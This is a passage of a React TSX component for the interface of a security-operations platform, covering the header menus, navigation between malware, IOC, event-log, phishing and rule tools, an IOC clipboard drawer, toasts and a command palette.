                className="w-8 h-8 rounded-lg border flex items-center justify-center relative cursor-pointer"
                style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
                aria-label="Notifications"
              >
                <span>🔔</span>
                {unreadCount > 0 && (
                  <span className="absolute -top-1 -right-1 w-4 h-4 rounded-full bg-red-500 text-white text-[10px] font-bold flex items-center justify-center">
                    {unreadCount}
                  </span>
                )}
              </button>

              {notificationsOpen && (
                <div
                  className="absolute right-0 mt-2 w-80 rounded-xl sc-surface-raised shadow-2xl p-3 space-y-2 z-50 border text-xs"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  <div className="flex items-center justify-between pb-1.5 border-b" style={{ borderColor: 'var(--color-border)' }}>
                    <span className="font-bold">Platform Activity ({unreadCount} unread)</span>
                    <button
                      type="button"
                      onClick={() => setActivityFeed(activityFeed.map((a) => ({ ...a, unread: false })))}
                      className="text-[11px] underline cursor-pointer"
                      style={{ color: 'var(--accent-from)' }}
                    >
                      Mark all read
                    </button>
                  </div>
                  <div className="max-h-64 overflow-y-auto space-y-2">
                    {activityFeed.map((act) => (
                      <div
                        key={act.id}
                        onClick={() => {
                          const td = TOOLS_REGISTRY[act.tool];
                          navigateTo(act.tool, td.mainTabs[1].id, act.targetSubTab || td.subTabs[0].id);
                        }}
                        className="p-2 rounded-lg border cursor-pointer hover:opacity-90"
                        style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border-subtle)' }}
                      >
                        <div className="font-semibold flex items-center justify-between">
                          <span>{TOOLS_REGISTRY[act.tool].shortName}</span>
                          <span className="sc-mono text-[10px]" style={{ color: 'var(--color-text-tertiary)' }}>{act.timestamp}</span>
                        </div>
                        <div className="text-[11px] mt-0.5" style={{ color: 'var(--color-text-secondary)' }}>
                          {act.description}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* Theme Toggle */}
            <button
              type="button"
              onClick={() => setTheme(resolvedTheme === 'dark' ? 'light' : 'dark')}
              className="w-8 h-8 rounded-lg border flex items-center justify-center cursor-pointer"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
              aria-label="Toggle Dark or Light Theme"
              title="Toggle Dark / Light Theme"
            >
              {resolvedTheme === 'dark' ? '🌙' : '☀️'}
            </button>

            {/* Settings Gear */}
            <button
              type="button"
              onClick={() => navigateTo('settings')}
              className="w-8 h-8 rounded-lg border flex items-center justify-center cursor-pointer"
              style={{ backgroundColor: page === 'settings' ? 'var(--accent-from)' : 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
              aria-label="Global Settings"
              title="Global Settings"
            >
              ⚙️
            </button>

            {/* User Avatar Dropdown */}
            <div className="relative">
              <button
                type="button"
                onClick={() => setUserMenuOpen(!userMenuOpen)}
                className="px-2.5 h-8 rounded-lg border flex items-center gap-1.5 text-xs font-bold cursor-pointer"
                style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
                aria-label="User Profile Menu"
              >
                <span className="w-5 h-5 rounded-full sc-accent-bg text-white flex items-center justify-center text-[10px]">
                  SC
                </span>
                <span className="hidden xl:inline">{userRole}</span>
              </button>

              {userMenuOpen && (
                <div
                  className="absolute right-0 mt-2 w-64 rounded-xl sc-surface-raised shadow-2xl p-3 space-y-2.5 z-50 border text-xs"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  <div>
                    <div className="font-bold">{userName}</div>
                    <div className="text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                      s.chen@secops.local · Role: <strong>{userRole}</strong>
                    </div>
                  </div>
                  <div className="pt-1 border-t space-y-1" style={{ borderColor: 'var(--color-border)' }}>
                    <div className="text-[10px] uppercase font-bold" style={{ color: 'var(--color-text-tertiary)' }}>
                      Switch RBAC Role Preview
                    </div>
                    <div className="flex gap-1">
                      {(['Admin', 'Analyst', 'Viewer'] as UserRole[]).map((r) => (
                        <button
                          key={r}
                          type="button"
                          onClick={() => {
                            setUserRole(r);
                            addToast({ type: 'info', title: `Switched Role to ${r}`, description: r === 'Viewer' ? 'Read-only mode active (uploads/deletes disabled).' : 'Full analyst permissions active.' });
                          }}
                          className={`flex-1 py-1 rounded text-[11px] font-semibold border cursor-pointer ${
                            userRole === r ? 'sc-accent-bg text-white' : ''
                          }`}
                          style={userRole === r ? {} : { borderColor: 'var(--color-border)' }}
                        >
                          {r}
                        </button>
                      ))}
                    </div>
                  </div>
                  <div className="pt-1 border-t flex items-center justify-between" style={{ borderColor: 'var(--color-border)' }}>
                    <button type="button" onClick={() => navigateTo('settings')} className="hover:underline cursor-pointer">
                      Profile Settings
                    </button>
                    <button type="button" onClick={() => navigateTo('login')} className="text-red-400 hover:underline cursor-pointer">
                      Sign In / Switch User
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Row 2: Conditional Sub-Tab Chips Bar (Only visible on a tool's working surface Tab 2) */}
        {currentToolDef && mainTab !== 'overview' && (
          <div
            className="h-[40px] border-t px-4 flex items-center justify-center"
            style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border-subtle)' }}
          >
            {/* Desktop Chip Row */}
            <div className="hidden xl:flex items-center gap-1.5" role="tablist">
              {currentToolDef.subTabs.map((st) => {
                const active = subTab === st.id;
                return (
                  <button
                    key={st.id}
                    type="button"
                    role="tab"
                    aria-selected={active}
                    onClick={() => setSubTab(st.id)}
                    className={`px-3.5 py-1 rounded-full text-xs font-semibold transition cursor-pointer ${
                      active ? 'sc-accent-bg text-white shadow' : 'border'
                    }`}
                    style={
                      active
                        ? {}
                        : { backgroundColor: 'var(--color-surface)', borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }
                    }
                  >
                    {st.label}
                  </button>
                );
              })}
            </div>

            {/* Responsive Collapse Dropdown below xl (1280px) */}
            <div className="xl:hidden flex items-center gap-2">
              <span className="text-xs font-semibold" style={{ color: 'var(--color-text-secondary)' }}>
                View:
              </span>
              <select
                value={subTab}
                onChange={(e) => setSubTab(e.target.value)}
                className="px-3 py-1 rounded-lg text-xs font-bold border"
                style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                aria-label="Select Tool Sub-Tab"
              >
                {currentToolDef.subTabs.map((st) => (
                  <option key={st.id} value={st.id}>
                    {st.label}
                  </option>
                ))}
              </select>
            </div>
          </div>
        )}
      </header>

      {/* =================================================================== */}
      {/* 5.3 BREADCRUMB TRAIL & CROSS-TOOL PIVOT BACKLINK BANNER             */}
      {/* =================================================================== */}
      {(currentToolDef || page === 'dashboard' || page === 'settings') && (
        <div className="max-w-[1440px] mx-auto px-4 pt-3 flex flex-wrap items-center justify-between gap-2 text-xs">
          <div className="flex items-center gap-1.5">
            <button
              type="button"
              onClick={() => navigateTo('home')}
              className="hover:underline cursor-pointer"
              style={{ color: 'var(--color-text-secondary)' }}
            >
              SecConflux
            </button>
            <span style={{ color: 'var(--color-text-tertiary)' }}>&gt;</span>
            {currentToolDef ? (
              <>
                <button
                  type="button"
                  onClick={() => navigateTo(currentToolDef.id, 'overview')}
                  className="hover:underline cursor-pointer"
                  style={{ color: 'var(--color-text-secondary)' }}
                >
                  {currentToolDef.name}
                </button>
                <span style={{ color: 'var(--color-text-tertiary)' }}>&gt;</span>
                <span className="font-semibold" style={{ color: 'var(--color-text-primary)' }}>
                  {currentToolDef.mainTabs.find((m) => m.id === mainTab)?.label}
                </span>
                {mainTab !== 'overview' && (
                  <>
                    <span style={{ color: 'var(--color-text-tertiary)' }}>&gt;</span>
                    <span className="font-bold" style={{ color: 'var(--accent-from)' }}>
                      {currentToolDef.subTabs.find((s) => s.id === subTab)?.label}
                    </span>
                  </>
                )}
              </>
            ) : (
              <span className="font-bold">{page === 'dashboard' ? 'Command Center Dashboard' : 'Global Settings'}</span>
            )}
          </div>

          {lastPivot && (
            <div
              className="inline-flex items-center gap-2 px-3 py-1 rounded-full border text-xs"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-focus)' }}
            >
              <button
                type="button"
                onClick={() => {
                  const prevTool = lastPivot.fromTool;
                  const pMain = lastPivot.fromMainTab;
                  const pSub = lastPivot.fromSubTab;
                  setLastPivot(null);
                  navigateTo(prevTool as PageRouteId, pMain, pSub);
                }}
                className="font-semibold hover:underline cursor-pointer"
                style={{ color: 'var(--accent-from)' }}
              >
                ← Return to {lastPivot.fromLabel}
              </button>
              <button
                type="button"
                onClick={() => setLastPivot(null)}
                className="text-[11px] opacity-70 hover:opacity-100 cursor-pointer"
                title="Dismiss pivot breadcrumb"
              >
                ✕
              </button>
            </div>
          )}
        </div>
      )}

      {/* =================================================================== */}
      {/* MAIN CONTENT AREA                                                   */}
      {/* =================================================================== */}
      <main key={`${page}-${mainTab}-${subTab}`} className={`max-w-[1440px] mx-auto sc-page-enter ${compactMode ? 'p-3' : 'p-4 sm:p-6'}`}>
        {page === 'home' && (
          <LandingPage
            activityFeed={activityFeed}
            onNavigate={navigateTo}
            onOpenTour={() => setTourOpen(true)}
            onQuickIocLookup={(ioc) => {
              setActiveIocQuery(ioc);
              navigateTo('ioc', 'lookup', 'lookup');
            }}
            onTriggerUploadModal={(tool) => {
              if (tool === 'malware') {
                navigateTo('malware', 'investigation', 'dashboard');
                setMalwareUploadOpen(true);
              } else if (tool === 'events') {
                navigateTo('events', 'investigation', 'events');
                setEventsUploadOpen(true);
              } else if (tool === 'phishing') {
                navigateTo('phishing', 'analysis', 'dashboard');
                setPhishingUploadOpen(true);
              }
            }}
          />
        )}

        {page === 'dashboard' && (
          <CommandCenterDashboard
            activityFeed={activityFeed}
            backendStatus={backendStatus}
            onNavigate={navigateTo}
            onPivot={handlePivot}
            onBatchEnrichAll={(iocs) => {
              setIocBatchPrefill(iocs);
              navigateTo('ioc', 'lookup', 'batch');
              addToast({ type: 'info', title: 'Loaded Correlated IOCs into Batch', description: `${iocs.length} indicators staged for batch enrichment.` });
            }}
            onAddToast={addToast}
          />
        )}

        {page === 'malware' && (
          <MalwareTool
            mainTab={mainTab}
            subTab={subTab}
            setMainTab={setMainTab}
            setSubTab={setSubTab}
            reports={malwareReports}
            activeReportId={activeMalwareId}
            setActiveReportId={setActiveMalwareId}
            onAddReport={(rep) => setMalwareReports((prev) => [rep, ...prev])}
            onDeleteReport={(id) => {
              const rem = malwareReports.filter((r) => r.id !== id);
              setMalwareReports(rem);
              if (rem.length > 0) setActiveMalwareId(rem[0].id);
            }}
            uploadModalOpen={malwareUploadOpen}
            setUploadModalOpen={setMalwareUploadOpen}
            onPivot={handlePivot}
            onPinIoc={handlePinIoc}
            onAddToast={addToast}
            userRole={userRole}
          />
        )}

        {page === 'ioc' && (
          <IocTool
            mainTab={mainTab}
            subTab={subTab}
            setMainTab={setMainTab}
            setSubTab={setSubTab}
            activeQuery={activeIocQuery}
            setActiveQuery={setActiveIocQuery}
            batchPrefill={iocBatchPrefill}
            onClearBatchPrefill={() => setIocBatchPrefill([])}
            onPivot={handlePivot}
            onPinIoc={handlePinIoc}
            onAddToast={addToast}
            userRole={userRole}
          />
        )}

        {page === 'events' && (
          <EventsTool
            mainTab={mainTab}
            subTab={subTab}
            setMainTab={setMainTab}
            setSubTab={setSubTab}
            initialSearchFilter={eventsSearchPrefill}
            onClearInitialSearch={() => setEventsSearchPrefill('')}
            uploadModalOpen={eventsUploadOpen}
            setUploadModalOpen={setEventsUploadOpen}
            onPivot={handlePivot}
            onPinIoc={handlePinIoc}
            onAddToast={addToast}
            userRole={userRole}
          />
        )}

        {page === 'phishing' && (
          <PhishingTool
            mainTab={mainTab}
            subTab={subTab}
            setMainTab={setMainTab}
            setSubTab={setSubTab}
            uploadModalOpen={phishingUploadOpen}
            setUploadModalOpen={setPhishingUploadOpen}
            onPivot={handlePivot}
            onPinIoc={handlePinIoc}
            onAddToast={addToast}
            userRole={userRole}
          />
        )}

        {page === 'ruleforge' && (
          <RuleForgeTool
            mainTab={mainTab}
            subTab={subTab}
            setMainTab={setMainTab}
            setSubTab={setSubTab}
            activeDialect={activeDialect}
            setActiveDialect={setActiveDialect}
            onPivot={handlePivot}
            onAddToast={addToast}
            userRole={userRole}
          />
        )}

        {page === 'settings' && (
          <SettingsPage
            theme={theme}
            setTheme={setTheme}
            fontScale={fontScale}
            setFontScale={setFontScale}
            compactMode={compactMode}
            setCompactMode={setCompactMode}
            reduceMotion={reduceMotion}
            setReduceMotion={setReduceMotion}
            backendStatus={backendStatus}
            onTestBackend={async (tid) => {
              const res = await apiClient.healthCheck(tid);
              setBackendStatus((prev) => ({ ...prev, [tid]: res.status }));
              addToast({
                type: res.status === 'online' ? 'success' : 'warning',
                title: `${TOOLS_REGISTRY[tid].name}: ${res.status.toUpperCase()}`,
                description: `Mode: ${res.mode} · Latency: ${res.latencyMs}ms · Version: ${res.version}`
              });
            }}
            onAddToast={addToast}
          />
        )}

        {page === 'login' && (
          <LoginPage
            authEnabled={authEnabled}
            setAuthEnabled={setAuthEnabled}
            onLoginSuccess={(u, r) => {
              setUserName(u);
              setUserRole(r);
              navigateTo('dashboard');
              addToast({ type: 'success', title: `Signed in as ${u}`, description: `Active RBAC Role: ${r}` });
            }}
          />
        )}
      </main>

      {/* =================================================================== */}
      {/* 13.3 FLOATING CROSS-TOOL IOC CLIPBOARD FAB & DRAWER                 */}
      {/* =================================================================== */}
      <div className="fixed bottom-5 right-5 z-40 flex flex-col items-end gap-2">
        {clipboardOpen && (
          <div
            className="w-80 sm:w-96 rounded-xl sc-surface-raised shadow-2xl p-4 space-y-3 border text-xs"
            style={{ borderColor: 'var(--color-border-focus)' }}
          >
            <div className="flex items-center justify-between border-b pb-2" style={{ borderColor: 'var(--color-border)' }}>
              <span className="font-bold">📌 Shared IOC Clipboard ({iocClipboard.length}/50)</span>
              <button type="button" onClick={() => setClipboardOpen(false)} className="cursor-pointer">
                ✕
              </button>
            </div>

            <div className="max-h-52 overflow-y-auto space-y-2">
              {iocClipboard.length === 0 ? (
                <div style={{ color: 'var(--color-text-secondary)' }}>No indicators pinned yet. Click "📌 Pin" on any IOC.</div>
              ) : (
                iocClipboard.map((item) => (
                  <div
                    key={item.id}
                    className="p-2 rounded border flex items-center justify-between gap-2"
                    style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border-subtle)' }}
                  >
                    <div className="min-w-0">
                      <div className="sc-mono font-bold truncate">{item.value}</div>
                      <div className="text-[10px]" style={{ color: 'var(--color-text-secondary)' }}>
                        From {TOOLS_REGISTRY[item.sourceTool].shortName}: {item.sourceContext}
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => setIocClipboard(iocClipboard.filter((x) => x.id !== item.id))}
                      className="text-red-400 cursor-pointer shrink-0"
                    >
                      ✕
                    </button>
                  </div>
                ))
              )}
            </div>

            {iocClipboard.length > 0 && (
              <div className="grid grid-cols-2 gap-2 pt-1">
                <button
                  type="button"
                  onClick={() => {
                    setIocBatchPrefill(iocClipboard.map((c) => c.value));
                    setClipboardOpen(false);
                    navigateTo('ioc', 'lookup', 'batch');
                  }}
                  className="py-1.5 px-2 rounded font-semibold text-white sc-accent-bg cursor-pointer text-center"
                >
                  Send All to IOC Batch
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setEventsSearchPrefill(iocClipboard[0].value);
                    setClipboardOpen(false);
                    navigateTo('events', 'investigation', 'events');
                  }}
                  className="py-1.5 px-2 rounded font-semibold border cursor-pointer text-center"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  Search in EVTX Logs
                </button>
              </div>
            )}
          </div>
        )}

        <button
          type="button"
          onClick={() => setClipboardOpen(!clipboardOpen)}
          className="px-4 py-2.5 rounded-full text-xs font-bold text-white sc-accent-bg shadow-2xl flex items-center gap-2 cursor-pointer"
        >
          <span>📌 IOC Clipboard</span>
          <span className="px-2 py-0.5 rounded-full bg-black/30 sc-mono">{iocClipboard.length}</span>
        </button>
      </div>

      {/* =================================================================== */}
      {/* 16.1 TOAST NOTIFICATION STACK                                       */}
      {/* =================================================================== */}
      <div className="fixed bottom-20 right-5 z-50 flex flex-col gap-2 max-w-sm w-full pointer-events-none" aria-live="polite">
        {toasts.map((t) => {
          const borderColors = {
            success: 'var(--color-clean)',
            warning: 'var(--color-suspicious)',
            error: 'var(--color-malicious)',
            info: 'var(--color-info)'
          };
          return (
            <div
              key={t.id}
              className="pointer-events-auto p-3.5 rounded-xl sc-surface-raised sc-toast-enter shadow-2xl border-l-4 flex items-start justify-between gap-3 text-xs"
              style={{ borderLeftColor: borderColors[t.type] }}
            >
              <div>
                <div className="font-bold">{t.title}</div>
                {t.description && (
                  <div className="mt-0.5" style={{ color: 'var(--color-text-secondary)' }}>
                    {t.description}
                  </div>
                )}
              </div>
              <button
                type="button"
                onClick={() => setToasts((prev) => prev.filter((x) => x.id !== t.id))}
                className="opacity-70 hover:opacity-100 cursor-pointer"
              >
                ✕
              </button>
            </div>
          );
        })}
      </div>

      {/* =================================================================== */}
      {/* 4.3 GLOBAL COMMAND PALETTE (Ctrl+K / Cmd+K)                         */}
      {/* =================================================================== */}
      <Modal
        open={commandPaletteOpen}
        title="Command Palette"
        subtitle="Jump to any engine, trigger an upload workflow, or toggle settings"
        onClose={() => setCommandPaletteOpen(false)}
        maxWidth="max-w-lg"
      >
        <div className="space-y-3 text-xs">
          <input
            type="text"
            autoFocus
            value={commandQuery}
            onChange={(e) => setCommandQuery(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === 'Enter' && commandItems.length > 0) {
                commandItems[0].action();
              }
            }}
            placeholder="Search tools, actions, settings..."
            className="w-full px-3.5 py-2 rounded-lg border sc-mono"
            style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border-focus)', color: 'var(--color-text-primary)' }}
          />
          <div className="max-h-72 overflow-y-auto space-y-1">
            {commandItems.map((item, idx) => (
              <button
                key={idx}
                type="button"
                onClick={item.action}
                className="w-full flex items-center justify-between px-3 py-2 rounded-lg hover:opacity-90 text-left cursor-pointer"
                style={{ backgroundColor: 'var(--color-surface)' }}
              >
                <div>
                  <span className="text-[10px] uppercase font-bold mr-2" style={{ color: 'var(--accent-from)' }}>
                    {item.category}
                  </span>
                  <span className="font-semibold">{item.label}</span>
                </div>
                <Kbd>{item.hotkey}</Kbd>
              </button>
            ))}
          </div>
        </div>
      </Modal>

      {/* 6.6 FIRST-RUN 7-SLIDE TOUR MODAL */}
      <FirstRunTourModal
        open={tourOpen}
        onClose={() => setTourOpen(false)}
        onNavigate={navigateTo}
      />
    </div>
  );
}
